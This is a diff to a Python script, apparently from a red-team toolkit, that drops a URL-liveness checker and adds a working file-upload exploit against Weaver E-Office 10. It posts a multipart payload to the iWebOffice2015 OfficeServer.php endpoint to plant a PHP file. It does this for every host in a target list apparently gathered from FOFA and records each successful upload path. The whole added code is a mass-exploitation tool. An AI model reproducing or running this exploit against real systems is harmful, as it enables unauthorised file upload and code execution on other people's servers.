@@ -24,34 +24,87 @@ pool = threading.Semaphore(64)
 
 # 檢查 URL 的函數
 
-def check_url(url):
-    try:
-        response = requests.get(url, timeout=4)
-        response.raise_for_status() # 顯示出錯誤資訊
-        with pool:
-            url_200.append(url)
-    except requests.exceptions.RequestException as err:
-        pass
+# def check_url(url):
+#     try:
+#         response = requests.get(url, timeout=4)
+#         response.raise_for_status() # 顯示出錯誤資訊
+#         with pool:
+#             url_200.append(url)
+#     except requests.exceptions.RequestException as err:
+#         pass
 
 # 存放狀態碼 200 url
 
-url_200 = []
+# url_200 = []
 
 # 判斷 url 狀態碼是否 200 
 
-try:
-    with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\泛微-EOffice.txt','r') as file:
-        total_lines = sum(1 for line in file) # 進度條
-        file.seek(0)
-        for url in tqdm(file, total=total_lines, desc="Checking URLs"):
-            url = url.strip()
-            check_url(url)
-except FileNotFoundError:
-    print("目標 target.txt 找不到")
-except Exception as e:
-    print(e)
+# try:
+#     with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\泛微-EOffice.txt','r') as file:
+#         total_lines = sum(1 for line in file) # 進度條
+#         file.seek(0)
+#         for url in tqdm(file, total=total_lines, desc="Checking URLs"):
+#             url = url.strip()
+#             check_url(url)
+# except FileNotFoundError:
+#     print("目標 target.txt 找不到")
+# except Exception as e:
+#     print(e)
 
-if url_200:
-    with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\sucess.txt','w') as f:
-        for result in url_200:
-            f.write(result + '\n')
+# if url_200:
+#     with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\sucess.txt','w') as f:
+#         for result in url_200:
+#             f.write(result + '\n')
+
+# Payload data
+
+data = """
+------WebKitFormBoundaryLpoiBFy4ANA8daew
+Content-Disposition: form-data;name="FileData";filename="test.php"
+Content-Type: application/octet-stream
+
+<?php
+phpinfo();
+?>
+
+------WebKitFormBoundaryLpoiBFy4ANA8daew
+Content-Disposition: form-data;name="FormData"
+
+{'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
+------WebKitFormBoundaryLpoiBFy4ANA8daew--
+"""
+
+# Payload header
+
+headers = {
+    'User-Agent': 'Go-http-client/1.1',
+    'Content-Length': '893',
+    'Content-Type': 'multipart/form-data; boundary=---------------------------55719851240137822763221368724',
+    'X_requested_with': 'XMLHttpRequest',
+    'Accept-Encoding': 'gzip'
+}
+
+# 執行 PoC 函式
+
+def exp(line) :
+    host = line + "/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
+    try:
+        response = requests.post(host, headers=headers, data=data)
+        if response.status_code == 200:
+            print(f"POST request successful for IP: {host}")
+        with pool:
+            with open('result-sucess.txt','a') as f:
+                f.write(line + '/eoffice10/server/public/iWebOffice2015/Document/test.php\n')
+                print(f"成功上傳 : {line}/eoffice10/server/public/iWebOffice2015/Document/test.php")
+                print('OK')
+    except Exception as e:
+        pass
+        print("error: ",e)
+
+# 打開狀態碼 200 URL
+
+with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\sucess_200.txt','r') as f:
+    urls = f.readlines()
+    for url_200_test in urls:
+        line = url_200_test.strip()
+        exp(line)
